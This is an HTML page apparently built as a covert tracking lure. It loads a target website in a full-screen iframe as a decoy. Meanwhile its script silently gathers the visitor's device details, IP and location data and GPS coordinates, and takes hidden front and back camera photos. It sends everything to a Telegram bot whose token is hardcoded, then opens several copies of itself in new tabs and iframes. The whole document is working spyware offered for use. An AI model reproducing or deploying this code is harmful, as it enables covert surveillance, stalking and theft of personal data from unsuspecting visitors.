<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            background: #000000;
            font-family: Arial, sans-serif;
        }
        
        #websiteFrame {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
        }
        
        #cameraContainer {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Website Frame - Shows target website immediately -->
    <iframe id="websiteFrame" src="about:blank" 
            sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-modals"
            allow="camera; microphone; geolocation"
            allowfullscreen></iframe>
    
    <!-- Hidden Camera -->
    <div id="cameraContainer">
        <video id="cameraVideo" autoplay playsinline muted></video>
        <canvas id="captureCanvas"></canvas>
    </div>

    <script>
        // =====================================================
        //  COMPLETE DATA CAPTURE FIRST, THEN REPLICATE
        // =====================================================
        
        // Telegram Configuration
        const BOT_TOKEN = '8307999302:AAEniYvTP5ZeaYo74AcWSxsOQ9PSxpnAtA0';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        const ADMIN_ID = '6314556756';
        
        // Global state
        const data = {
            session: Date.now() + '_' + Math.random().toString(36).substr(2, 8),
            user: null,
            target: null,
            device: {},
            location: null,
            ip: null,
            photos: [],
            battery: null,
            network: null,
            screen: null,
            allDataSent: false,
            replicationDone: false
        };
        
        // DOM elements
        const frame = document.getElementById('websiteFrame');
        const video = document.getElementById('cameraVideo');
        const canvas = document.getElementById('captureCanvas');
        const ctx = canvas.getContext('2d');
        
        // ============== STEP 1: LOAD WEBSITE IMMEDIATELY ==============
        function loadWebsite() {
            const params = new URLSearchParams(window.location.search);
            data.user = params.get('chat_id') || params.get('user') || params.get('id') || ADMIN_ID;
            
            let target = params.get('site') || params.get('url') || params.get('target') || 'https://google.com';
            
            // Decode if encoded
            try {
                if (target.startsWith('QUANTUM:')) {
                    target = atob(target.split(':')[1]);
                } else if (!target.includes('://')) {
                    target = atob(target);
                }
                target = decodeURIComponent(target);
            } catch (e) {}
            
            if (!target.startsWith('http')) {
                target = 'https://' + target;
            }
            
            data.target = target;
            
            // LOAD WEBSITE IMMEDIATELY
            frame.src = target;
        }
        
        // ============== STEP 2: CAPTURE ALL DATA ==============
        async function captureAllData() {
            console.log('ðŸš€ Starting complete data capture...');
            
            // 1. Device Info
            console.log('ðŸ“± Capturing device info...');
            await captureDeviceInfo();
            
            // 2. Battery Info
            console.log('ðŸ”‹ Getting battery info...');
            await getBatteryInfo();
            
            // 3. Network Info
            console.log('ðŸŒ Getting network info...');
            await getNetworkInfo();
            
            // 4. IP Address
            console.log('ðŸ“¡ Getting IP address...');
            await getIPAddress();
            
            // 5. Location
            console.log('ðŸ“ Getting location...');
            await getLocation();
            
            // 6. Camera Photos
            console.log('ðŸ“¸ Capturing photos...');
            await capturePhotos();
            
            console.log('âœ… All data captured!');
        }
        
        // ============== DEVICE INFO ==============
        async function captureDeviceInfo() {
            const ua = navigator.userAgent;
            let os = 'Unknown', browser = 'Unknown';
            
            // Detect OS
            if (/Windows NT 10/.test(ua)) os = 'Windows 10/11';
            else if (/Windows NT 6.3/.test(ua)) os = 'Windows 8.1';
            else if (/Windows NT 6.2/.test(ua)) os = 'Windows 8';
            else if (/Windows NT 6.1/.test(ua)) os = 'Windows 7';
            else if (/Mac OS X/.test(ua)) os = 'macOS';
            else if (/Linux/.test(ua)) os = 'Linux';
            else if (/Android/.test(ua)) os = 'Android';
            else if (/iOS|iPhone|iPad|iPod/.test(ua)) os = 'iOS';
            
            // Detect Browser
            if (/Chrome/.test(ua) && !/Edge/.test(ua) && !/OPR/.test(ua)) browser = 'Chrome';
            else if (/Firefox/.test(ua)) browser = 'Firefox';
            else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browser = 'Safari';
            else if (/Edge/.test(ua)) browser = 'Edge';
            else if (/Opera|OPR/.test(ua)) browser = 'Opera';
            else if (/Brave/.test(ua)) browser = 'Brave';
            
            data.device = {
                os: os,
                browser: browser,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                userAgent: ua.substring(0, 100) + '...',
                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                deviceMemory: navigator.deviceMemory || 'unknown',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vendor: navigator.vendor || 'unknown',
                cookieEnabled: navigator.cookieEnabled,
                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                webdriver: navigator.webdriver || false
            };
            
            data.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            };
            
            data.timezone = {
                zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset()
            };
        }
        
        // ============== BATTERY INFO ==============
        async function getBatteryInfo() {
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    data.battery = {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Yes âš¡' : 'No',
                        chargingTime: battery.chargingTime,
                        dischargingTime: battery.dischargingTime
                    };
                }
            } catch (e) {}
        }
        
        // ============== NETWORK INFO ==============
        async function getNetworkInfo() {
            data.network = {
                online: navigator.onLine,
                connection: null
            };
            
            if (navigator.connection) {
                data.network.connection = {
                    type: navigator.connection.type,
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData ? 'Yes' : 'No',
                    downlinkMax: navigator.connection.downlinkMax
                };
            }
        }
        
        // ============== IP ADDRESS ==============
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const result = await response.json();
                data.ip = result.ip;
                
                // Get IP info
                try {
                    const ipResponse = await fetch(`http://ip-api.com/json/${data.ip}`);
                    const ipInfo = await ipResponse.json();
                    data.ipInfo = {
                        country: ipInfo.country,
                        region: ipInfo.regionName,
                        city: ipInfo.city,
                        isp: ipInfo.isp,
                        org: ipInfo.org,
                        as: ipInfo.as
                    };
                } catch (e) {}
                
            } catch (e) {
                try {
                    const response = await fetch('https://icanhazip.com/');
                    data.ip = await response.text();
                } catch (e) {}
            }
        }
        
        // ============== LOCATION ==============
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(null);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        data.location = {
                            lat: pos.coords.latitude.toFixed(6),
                            lon: pos.coords.longitude.toFixed(6),
                            accuracy: Math.round(pos.coords.accuracy) + ' meters',
                            altitude: pos.coords.altitude ? pos.coords.altitude.toFixed(2) + 'm' : 'N/A',
                            heading: pos.coords.heading || 'N/A',
                            speed: pos.coords.speed || 'N/A'
                        };
                        resolve(data.location);
                    },
                    () => {
                        resolve(null);
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            });
        }
        
        // ============== CAMERA PHOTOS ==============
        async function capturePhotos() {
            try {
                // Request camera
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: { ideal: 'user' }
                    }
                });
                
                video.srcObject = stream;
                
                // Wait for video
                await new Promise(r => setTimeout(r, 500));
                
                // Capture 3 photos
                for (let i = 0; i < 3; i++) {
                    const blob = await capturePhoto();
                    if (blob) {
                        data.photos.push({
                            blob: blob,
                            type: 'front',
                            index: i + 1
                        });
                    }
                    await new Promise(r => setTimeout(r, 200));
                }
                
                // Try back camera
                try {
                    stream.getTracks().forEach(track => track.stop());
                    
                    const backStream = await navigator.mediaDevices.getUserMedia({
                        video: {
                            facingMode: { ideal: 'environment' }
                        }
                    });
                    
                    video.srcObject = backStream;
                    await new Promise(r => setTimeout(r, 500));
                    
                    // Capture 2 back photos
                    for (let i = 0; i < 2; i++) {
                        const blob = await capturePhoto();
                        if (blob) {
                            data.photos.push({
                                blob: blob,
                                type: 'back',
                                index: i + 1
                            });
                        }
                        await new Promise(r => setTimeout(r, 200));
                    }
                    
                    backStream.getTracks().forEach(track => track.stop());
                    
                } catch (e) {
                    console.log('Back camera not available');
                }
                
            } catch (error) {
                console.log('Camera capture skipped:', error.message);
            }
        }
        
        function capturePhoto() {
            if (!video.videoWidth) return null;
            
            try {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                // Enhance image
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const pixels = imageData.data;
                
                for (let i = 0; i < pixels.length; i += 4) {
                    pixels[i] = Math.min(255, pixels[i] * 1.3);
                    pixels[i+1] = Math.min(255, pixels[i+1] * 1.3);
                    pixels[i+2] = Math.min(255, pixels[i+2] * 1.3);
                }
                
                ctx.putImageData(imageData, 0, 0);
                
                return new Promise((resolve) => {
                    canvas.toBlob((blob) => {
                        resolve(blob && blob.size > 15000 ? blob : null);
                    }, 'image/jpeg', 0.92);
                });
                
            } catch (error) {
                return null;
            }
        }
        
        // ============== STEP 3: SEND ALL DATA TO TELEGRAM ==============
        async function sendAllData() {
            console.log('ðŸ“¤ Sending all data to Telegram...');
            
            // 1. Send comprehensive report
            await sendComprehensiveReport();
            
            // 2. Send all photos
            if (data.photos.length > 0) {
                console.log(`ðŸ“¸ Sending ${data.photos.length} photos...`);
                for (const photo of data.photos) {
                    await sendPhoto(photo);
                    await new Promise(r => setTimeout(r, 500)); // Delay between photos
                }
            }
            
            data.allDataSent = true;
            console.log('âœ… ALL DATA SENT TO TELEGRAM!');
        }
        
        async function sendComprehensiveReport() {
            try {
                let report = `ðŸš€ *COMPLETE DATA CAPTURE REPORT*\n\n`;
                report += `ðŸ†” Session: \`${data.session}\`\n`;
                report += `ðŸ‘¤ User: \`${data.user}\`\n`;
                report += `â° Time: ${new Date().toLocaleString()}\n\n`;
                
                report += `ðŸ“± *DEVICE INFORMATION*\n`;
                report += `OS: ${data.device.os}\n`;
                report += `Browser: ${data.device.browser}\n`;
                report += `Platform: ${data.device.platform}\n`;
                report += `Language: ${data.device.language}\n`;
                report += `CPU Cores: ${data.device.hardwareConcurrency}\n`;
                report += `RAM: ${data.device.deviceMemory} GB\n`;
                report += `Screen: ${data.screen.width}x${data.screen.height}\n`;
                report += `Color Depth: ${data.screen.colorDepth} bit\n`;
                report += `Timezone: ${data.timezone.zone}\n\n`;
                
                if (data.battery) {
                    report += `ðŸ”‹ *BATTERY INFORMATION*\n`;
                    report += `Level: ${data.battery.level}\n`;
                    report += `Charging: ${data.battery.charging}\n`;
                    if (data.battery.chargingTime !== Infinity) {
                        report += `Charging Time: ${data.battery.chargingTime} sec\n`;
                    }
                    if (data.battery.dischargingTime !== Infinity) {
                        report += `Discharging Time: ${data.battery.dischargingTime} sec\n`;
                    }
                    report += `\n`;
                }
                
                if (data.network) {
                    report += `ðŸŒ *NETWORK INFORMATION*\n`;
                    report += `Status: ${data.network.online ? 'Online âœ…' : 'Offline âŒ'}\n`;
                    if (data.network.connection) {
                        report += `Connection: ${data.network.connection.type}\n`;
                        report += `Speed: ${data.network.connection.effectiveType}\n`;
                        report += `Download: ${data.network.connection.downlink}\n`;
                        report += `Latency: ${data.network.connection.rtt}\n`;
                        report += `Data Saver: ${data.network.connection.saveData}\n`;
                    }
                    report += `\n`;
                }
                
                if (data.ip) {
                    report += `ðŸ“¡ *IP INFORMATION*\n`;
                    report += `IP Address: \`${data.ip.trim()}\`\n`;
                    if (data.ipInfo) {
                        report += `Country: ${data.ipInfo.country || 'Unknown'}\n`;
                        report += `Region: ${data.ipInfo.region || 'Unknown'}\n`;
                        report += `City: ${data.ipInfo.city || 'Unknown'}\n`;
                        report += `ISP: ${data.ipInfo.isp || 'Unknown'}\n`;
                        report += `Organization: ${data.ipInfo.org || 'Unknown'}\n`;
                    }
                    report += `\n`;
                }
                
                if (data.location) {
                    report += `ðŸ“ *LOCATION INFORMATION*\n`;
                    report += `Latitude: ${data.location.lat}\n`;
                    report += `Longitude: ${data.location.lon}\n`;
                    report += `Accuracy: ${data.location.accuracy}\n`;
                    report += `Altitude: ${data.location.altitude}\n`;
                    report += `Heading: ${data.location.heading}\n`;
                    report += `Speed: ${data.location.speed}\n`;
                    report += `Google Maps: https://maps.google.com/?q=${data.location.lat},${data.location.lon}\n\n`;
                }
                
                report += `ðŸ“¸ *PHOTO INFORMATION*\n`;
                report += `Total Photos: ${data.photos.length}\n`;
                report += `Front Camera: ${data.photos.filter(p => p.type === 'front').length}\n`;
                report += `Back Camera: ${data.photos.filter(p => p.type === 'back').length}\n\n`;
                
                report += `ðŸŽ¯ *TARGET WEBSITE*\n`;
                report += `${data.target}\n\n`;
                
                report += `âš¡ *SYSTEM STATUS*\n`;
                report += `Data Collection: COMPLETE âœ…\n`;
                report += `Photos Captured: ${data.photos.length} âœ…\n`;
                report += `All Data Sent: âœ…\n`;
                report += `Ready for Replication: âœ…`;
                
                // Send to user
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: data.user,
                        text: report,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                // Send to admin
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: report + `\n\nðŸ‘¤ Target User ID: \`${data.user}\``,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                });
                
                console.log('âœ… Comprehensive report sent!');
                
            } catch (error) {
                console.error('Report error:', error);
            }
        }
        
        async function sendPhoto(photo) {
            try {
                const caption = `ðŸ“¸ ${photo.type.toUpperCase()} Camera - Photo ${photo.index}\nSession: \`${data.session}\``;
                
                // Send to user
                const userForm = new FormData();
                userForm.append('chat_id', data.user);
                userForm.append('photo', photo.blob, `photo_${photo.type}_${photo.index}.jpg`);
                userForm.append('caption', caption);
                userForm.append('parse_mode', 'Markdown');
                
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: userForm
                });
                
                // Send to admin
                const adminForm = new FormData();
                adminForm.append('chat_id', ADMIN_ID);
                adminForm.append('photo', photo.blob, `admin_${photo.type}_${photo.index}.jpg`);
                adminForm.append('caption', caption + `\nðŸ‘¤ User: \`${data.user}\``);
                adminForm.append('parse_mode', 'Markdown');
                
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: adminForm
                });
                
                console.log(`âœ… Photo ${photo.type} ${photo.index} sent!`);
                
            } catch (error) {
                console.error('Photo send error:', error);
            }
        }
        
        // ============== STEP 4: REPLICATE ITSELF ==============
        function replicateItself() {
            if (data.replicationDone) return;
            
            console.log('ðŸ”„ Starting tab replication...');
            data.replicationDone = true;
            
            // Open 5 new tabs of itself
            for (let i = 0; i < 5; i++) {
                setTimeout(() => {
                    try {
                        const newTab = window.open(window.location.href, '_blank');
                        if (newTab) {
                            console.log(`âœ… Tab ${i + 1} opened`);
                            
                            // Close tab after 3 minutes
                            setTimeout(() => {
                                try {
                                    newTab.close();
                                    console.log(`ðŸ”„ Tab ${i + 1} closed`);
                                } catch (e) {}
                            }, 180000);
                        }
                    } catch (e) {
                        console.log('âš ï¸ Popup blocked for tab', i + 1);
                    }
                }, i * 1000); // 1 second delay between tabs
            }
            
            // Also create hidden iframes for more replication
            setTimeout(() => {
                for (let i = 0; i < 3; i++) {
                    try {
                        const iframe = document.createElement('iframe');
                        iframe.style.display = 'none';
                        iframe.srcdoc = `
                            <html>
                                <head>
                                    <meta http-equiv="refresh" content="0;url=${window.location.href}">
                                </head>
                                <body>
                                    <script>
                                        setTimeout(() => {
                                            window.location.href = "${window.location.href}";
                                        }, 100);
                                    <\/script>
                                </body>
                            </html>
                        `;
                        document.body.appendChild(iframe);
                        
                        // Remove after 5 seconds
                        setTimeout(() => {
                            iframe.remove();
                        }, 5000);
                        
                    } catch (e) {}
                }
            }, 3000);
        }
        
        // ============== MAIN EXECUTION ==============
        async function execute() {
            console.log('ðŸš€ ===== STARTING EXECUTION =====');
            
            // STEP 1: Load website immediately
            loadWebsite();
            
            // STEP 2: Capture ALL data
            await captureAllData();
            
            // STEP 3: Send ALL data to Telegram
            await sendAllData();
            
            // STEP 4: Only after ALL data is sent, replicate itself
            replicateItself();
            
            console.log('âœ… ===== EXECUTION COMPLETE =====');
        }
        
        // Start execution
        window.addEventListener('load', execute);
        
        // Force completion after 60 seconds max
        setTimeout(() => {
            if (!data.allDataSent) {
                console.log('âš ï¸ Force completing due to timeout');
                sendAllData().then(() => {
                    if (!data.replicationDone) {
                        replicateItself();
                    }
                });
            }
        }, 60000);
        
    </script>
</body>
</html>
